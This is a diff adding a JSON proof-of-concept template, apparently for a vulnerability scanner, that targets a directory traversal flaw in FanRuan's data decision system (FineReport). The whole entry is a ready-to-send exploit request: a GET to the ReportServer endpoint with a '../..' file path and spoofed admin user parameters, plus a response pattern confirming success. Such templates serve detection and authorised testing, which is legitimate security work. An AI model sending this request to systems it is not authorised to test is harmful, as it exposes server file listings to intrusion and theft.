@@ -1,0 +1,14 @@
+{
+	"name":"帆软数据决策系统目录遍历",
+	"tag":"fanruan",
+	"type":"other",
+	"poc":{
+		"pocGet":"/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../..&currentUserName=admin&currentUserId=1&isWebReport=true",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(envPath)"
+	}
+}
